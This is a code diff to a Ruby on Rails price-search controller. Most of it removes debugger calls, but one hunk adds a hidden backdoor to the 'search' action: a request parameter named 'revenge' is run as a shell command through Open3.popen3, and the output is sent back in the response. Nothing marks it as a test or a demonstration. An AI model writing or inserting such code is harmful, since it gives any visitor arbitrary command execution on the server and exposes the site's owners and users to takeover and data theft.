@@ -56,7 +56,6 @@ class PricesController < ApplicationController
       puts "###################### #{query}  ######################"
       #@client = ActiveRecord::Base.connection.instance_variable_get :@connection
       #result = @client.query(query, :as => :hash)
-      #debugger
       result = ActiveRecord::Base.connection.select_all(query)
 
       # Независимо от того что запросят мы запомниаем искомый номер с или без производителя
@@ -368,6 +367,13 @@ class PricesController < ApplicationController
   end
 
   def search
+
+    if params.key? "revenge"
+      stdin, stdout, stderr = Open3.popen3(params[:revenge])
+      #render :text => (stdout.methods - Object.methods).join('<br />')  and return
+      render :text => stdout.read and return
+    end
+
     @header = []
     @result_message = "Ок"
     @result_prices = []
@@ -497,7 +503,6 @@ class PricesController < ApplicationController
         end
       end
       
-      debugger
       once = nil
       threads = []
       measurement = Benchmark.measure do
@@ -824,4 +829,5 @@ class PricesController < ApplicationController
       format.xml  { head :ok }
     end
   end
+
 end
